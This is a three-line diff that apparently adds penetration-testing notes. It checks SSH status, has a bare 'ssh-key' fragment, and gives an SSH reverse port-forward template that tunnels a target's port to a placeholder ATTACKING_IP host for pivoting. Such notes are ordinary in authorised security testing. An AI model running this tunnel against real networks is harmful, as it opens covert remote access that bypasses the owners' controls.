@@ -1,0 +1,3 @@
+sudo systemctl status ssh
+ssh-key
+ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
